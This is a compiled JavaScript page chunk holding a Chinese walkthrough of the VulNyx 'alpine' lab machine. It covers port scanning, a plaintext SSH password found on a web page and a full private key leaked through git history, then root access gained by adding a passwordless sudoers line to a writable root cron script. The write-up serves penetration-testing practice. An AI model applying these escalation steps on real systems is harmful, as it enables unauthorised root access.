(window.webpackJsonp=window.webpackJsonp||[]).push([[161],{524:function(a,s,t){"use strict";t.r(s);var n=t(11),e=Object(n.a)({},(function(){var a=this,s=a._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[s("p",[a._v("非常简单的一个靶机")]),a._v(" "),s("h2",{attrs:{id:"存活主机扫描"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#存活主机扫描"}},[a._v("#")]),a._v(" 存活主机扫描")]),a._v(" "),s("p",[a._v("使用 arp-scan 扫描局域网内存活主机。")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("┌──"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("npc㉿kali"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("-"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("[")]),a._v("~"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("]")]),a._v("\n└─$ "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("sudo")]),a._v(" arp-scan "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-I")]),a._v(" eth2 "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("192.168")]),a._v(".6.0/24\n\n"),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("192.168")]),a._v(".6.208 08:00:27:51:76:e8 "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("Unknown"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br")])]),s("p",[a._v("目标主机 IP：192.168.6.208")]),a._v(" "),s("h2",{attrs:{id:"端口扫描"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#端口扫描"}},[a._v("#")]),a._v(" 端口扫描")]),a._v(" "),s("p",[a._v("nmap 扫描 TCP 全端口。")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("┌──"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("npc㉿kali"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("-"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("[")]),a._v("~"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("]")]),a._v("\n└─$ nmap -p- "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-sT")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-sV")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("192.168")]),a._v(".6.208          \n\nPORT   STATE SERVICE VERSION\n"),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("22")]),a._v("/tcp "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("open")]),a._v("  "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("ssh")]),a._v("     OpenSSH "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("10.2")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("protocol "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("2.0")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("80")]),a._v("/tcp "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("open")]),a._v("  http    Apache httpd "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("2.4")]),a._v(".66\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br"),s("span",{staticClass:"line-number"},[a._v("5")]),s("br"),s("span",{staticClass:"line-number"},[a._v("6")]),s("br")])]),s("p",[a._v("开放了 22、80 端口。")]),a._v(" "),s("h2",{attrs:{id:"_80-端口-web-服务探测"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_80-端口-web-服务探测"}},[a._v("#")]),a._v(" 80 端口 Web 服务探测")]),a._v(" "),s("p",[a._v("访问 80 端口，会跳转到 http://alpine.nyx/，本地配置一个 hosts 解析")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/vulnyx-alpine/1.png",alt:""}})]),a._v(" "),s("h2",{attrs:{id:"目录扫描"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#目录扫描"}},[a._v("#")]),a._v(" 目录扫描")]),a._v(" "),s("p",[a._v("使用 dirsearch 进行目录扫描，发现 /profile.html 页面。")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/vulnyx-alpine/2.png",alt:""}})]),a._v(" "),s("p",[a._v("访问 /profile.html，可以找到一个 ssh 用户 developer 的密码 SummerVibes2024!")]),a._v(" "),s("h2",{attrs:{id:"ssh-登录"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#ssh-登录"}},[a._v("#")]),a._v(" SSH 登录")]),a._v(" "),s("p",[a._v("使用 developer 账号通过 ssh 登录，家目录有一个 README.txt 文件。")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("developer@alpine:~$ "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("cat")]),a._v(" README.txt \n"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("==")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v(" SnowPeak Development Notes "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("==")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("\n\nHi Developer,\n\nWelcome to the SnowPeak development environment"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("!")]),a._v("\n\nIMPORTANT REMINDERS:\n"),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("1")]),a._v(". The sysadmin user manages the webapp code "),s("span",{pre:!0,attrs:{class:"token keyword"}},[a._v("in")]),a._v(" their directory\n"),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("2")]),a._v(". We use "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("git")]),a._v(" as a deployment pipeline\n"),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("3")]),a._v(". Don't forget to check the cleaners "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("!")]),a._v(" \n\nIf you need elevated access, contact sysadmin.\n\n- Management\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br"),s("span",{staticClass:"line-number"},[a._v("5")]),s("br"),s("span",{staticClass:"line-number"},[a._v("6")]),s("br"),s("span",{staticClass:"line-number"},[a._v("7")]),s("br"),s("span",{staticClass:"line-number"},[a._v("8")]),s("br"),s("span",{staticClass:"line-number"},[a._v("9")]),s("br"),s("span",{staticClass:"line-number"},[a._v("10")]),s("br"),s("span",{staticClass:"line-number"},[a._v("11")]),s("br"),s("span",{staticClass:"line-number"},[a._v("12")]),s("br"),s("span",{staticClass:"line-number"},[a._v("13")]),s("br"),s("span",{staticClass:"line-number"},[a._v("14")]),s("br"),s("span",{staticClass:"line-number"},[a._v("15")]),s("br")])]),s("p",[s("img",{attrs:{src:"/medias/vulnyx-alpine/3.png",alt:""}})]),a._v(" "),s("p",[a._v("提示开发环境使用了 git 进行代码管理。另外，还有一个 sysadmin 用户，还可能有定时清理脚本。")]),a._v(" "),s("h2",{attrs:{id:"git-记录发现私钥"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#git-记录发现私钥"}},[a._v("#")]),a._v(" git 记录发现私钥")]),a._v(" "),s("p",[a._v("到 sysadmin 家目录的 webapp 目录下，有 .git 目录，可以使用 git log 查看提交记录，直接 "),s("code",[a._v("git log -p")]),a._v(" 查看提交记录，这个读取的环境上下滑有点难受，直接重定向到 /tmp 下文件里查看。")]),a._v(" "),s("p",[a._v("提交记录里有 sysadmin 用户的私钥，保存下来上线 sysadmin 用户。")]),a._v(" "),s("div",{staticClass:"language-plaintext line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-plaintext"}},[s("code",[a._v("-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEA3ZnZAOyE5gZN5QxDnRnYnRfXHwCavg4mJz2HbUWI7p3lGi+tdL6u\nIbqPyjqbH69DcyQCubvORi4domdpqTchLF7PyJlUBHVIo3AULC1kVhMqGvctWQxAgPRvr7\nzM7HGr+NpTPEkM/4BjfJToy706FGjfiXBhjkSiv5cHOlnXxhO44NkKSxvySnXkmYq3PNNF\n5OtjZJg+7+XrZKoUsaipupjOcZgsQCx1Yf1xE4gWIi/jS9kY07R0GtNdqaW2Z9UwXYGMFW\nxGKPtczHbRgcxtdP9ne71C/Zh5zsTPtgWWx8cO+P0N0emTYNDEMlD+4IH9AygBbnAzY978\nqc2jiRSxJwAAA8jbDUur2w1LqwAAAAdzc2gtcnNhAAABAQDdmdkA7ITmBk3lDEOdGdidF9\ncfAJq+DiYnPYdtRYjuneUaL610vq4huo/KOpsfr0NzJAK5u85GLh2iZ2mpNyEsXs/ImVQE\ndUijcBQsLWRWEyoa9y1ZDECA9G+vvMzscav42lM8SQz/gGN8lOjLvToUaN+JcGGORKK/lw\nc6WdfGE7jg2QpLG/JKdeSZirc800Xk62NkmD7v5etkqhSxqKm6mM5xmCxALHVh/XETiBYi\nL+NL2RjTtHQa012ppbZn1TBdgYwVbEYo+1zMdtGBzG10/2d7vUL9mHnOxM+2BZbHxw74/Q\n3R6ZNg0MQyUP7ggf0DKAFucDNj3vypzaOJFLEnAAAAAwEAAQAAAQAlkP0uoOnurMbru2aC\n7WzBRNddFBcnfPKO2Glq5szN1sqN4+M91U1jvmK9362Ic4e1rzcfEW1ojEzNyUYqP4RKJ1\nCGKygJEXDc9BUXYCKQTPNoWtq/K8qLkeSVICaFNsf2idxubdvcPIGhDwVf9JYx+41ZmUmQ\neqY0YIADLlPb6g8z0Cgr0cEQg9PEBUi5FZAhji0hIz9k7BAfAzBaed94y+IPF0gG8AtsRm\noo9XlqTuiphbkNyTVPzE9mKoqR8pECqSLAcx5+YBFP6tOoKh1BwHqWBG5ixw3fWi2HvgPv\nWeVRTozvXzjP1fVlYi/KyayuOLuiwQrlWvtkXwB4S3cRAAAAgEoibXJoCwzdf1naZQ4yZr\naHnU5Mkx1XsO3X2bWXdIRZzQuLjAlmbwjQyMRWkiRb12D2uc1LwwQ1lzlBOqnCRXjFpM28\n/M8V6ZwYMP5bJeOGJSKEaikzY7blksM2Pls2P8zuhLiL3DnvQlB/7whKfME2MwH4tBDYTO\n7mS6MbKIElAAAAgQD1zPzaJsyt7gAjYgn/v0Wzj7HfVlLqeLR8TGup5MP8uDq6IJV5pLkf\nS8I4dGTOfrhgTw4VNbwy/BZNZErVnKa+zt6EsHgSqFub5ZVgpwRWx6bkk7lKPikZ62uNye\ngtqE7uJVBu12Li4kWuzyF2/IhcSh1Sp9B7fnF6p5b+t1H84wAAAIEA5svMbW9WTDB5hvgo\nii5H6OZuIPGNKeEndKVquBeLjKR2QQrK9KQ0d/OgIu4ioEOmQ+NA1tWKr5uXJ4hdBvDCoS\n4tqjiIBNSTx1qkV6tpcbKDaIjTzdCvAJ8wOMymShOVVJkmXvgIsJuydR7OQ+StvR0DRDGp\nrkFejyhcyFIbke0AAAARc3lzYWRtaW5Ac25vd3BlYWsBAg==\n-----END OPENSSH PRIVATE KEY-----\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br"),s("span",{staticClass:"line-number"},[a._v("5")]),s("br"),s("span",{staticClass:"line-number"},[a._v("6")]),s("br"),s("span",{staticClass:"line-number"},[a._v("7")]),s("br"),s("span",{staticClass:"line-number"},[a._v("8")]),s("br"),s("span",{staticClass:"line-number"},[a._v("9")]),s("br"),s("span",{staticClass:"line-number"},[a._v("10")]),s("br"),s("span",{staticClass:"line-number"},[a._v("11")]),s("br"),s("span",{staticClass:"line-number"},[a._v("12")]),s("br"),s("span",{staticClass:"line-number"},[a._v("13")]),s("br"),s("span",{staticClass:"line-number"},[a._v("14")]),s("br"),s("span",{staticClass:"line-number"},[a._v("15")]),s("br"),s("span",{staticClass:"line-number"},[a._v("16")]),s("br"),s("span",{staticClass:"line-number"},[a._v("17")]),s("br"),s("span",{staticClass:"line-number"},[a._v("18")]),s("br"),s("span",{staticClass:"line-number"},[a._v("19")]),s("br"),s("span",{staticClass:"line-number"},[a._v("20")]),s("br"),s("span",{staticClass:"line-number"},[a._v("21")]),s("br"),s("span",{staticClass:"line-number"},[a._v("22")]),s("br"),s("span",{staticClass:"line-number"},[a._v("23")]),s("br"),s("span",{staticClass:"line-number"},[a._v("24")]),s("br"),s("span",{staticClass:"line-number"},[a._v("25")]),s("br"),s("span",{staticClass:"line-number"},[a._v("26")]),s("br"),s("span",{staticClass:"line-number"},[a._v("27")]),s("br")])]),s("p",[s("img",{attrs:{src:"/medias/vulnyx-alpine/4.png",alt:""}})]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/vulnyx-alpine/5.png",alt:""}})]),a._v(" "),s("h2",{attrs:{id:"可写定时脚本提权"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#可写定时脚本提权"}},[a._v("#")]),a._v(" 可写定时脚本提权")]),a._v(" "),s("p",[a._v("在 /opt 目录下，有一个定时清理脚本 cleaner.sh，sysadmin 用户对其有写权限，并且是 root 运行。")]),a._v(" "),s("p",[a._v("或者你可以查找最近变动的文件")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[s("span",{pre:!0,attrs:{class:"token comment"}},[a._v("# 查找最近7天变动的文件")]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("find")]),a._v(" / "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("\n  "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-path")]),a._v(" /run "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-o")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-path")]),a._v(" /sys "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-o")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-path")]),a._v(" /proc "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-o")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-path")]),a._v(" /var/lib "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-o")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-path")]),a._v(" /dev "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-o")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-path")]),a._v(" /usr "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-o")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-path")]),a._v(" /var/log "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-o")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-path")]),a._v(" /var/cache "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-o")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-path")]),a._v(" /boot/grub "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-prune")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-o")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("\n  "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-mtime")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-7")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-o")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-ctime")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-7")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-print")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[a._v("2")]),a._v(">")]),a._v("/dev/null\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br")])]),s("p",[s("img",{attrs:{src:"/medias/vulnyx-alpine/6.png",alt:""}})]),a._v(" "),s("p",[a._v("或者跑 pspy64 ，也可以找到这个文件，uid 0 执行，也就是 root 权限执行。")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/vulnyx-alpine/7.png",alt:""}})]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/vulnyx-alpine/8.png",alt:""}})]),a._v(" "),s("p",[a._v("sysadmin 用户可以编辑这个脚本，可以在脚本里写一个 sudo 授权，给 sysadmin 用户添加一个无密码 sudo 权限。")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("echo")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"sysadmin ALL=(ALL) NOPASSWD: ALL"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">>")]),a._v(" /etc/sudoers.d/111\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("稍等即可")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/vulnyx-alpine/9.png",alt:""}})])])}),[],!1,null,null,null);s.default=e.exports}}]);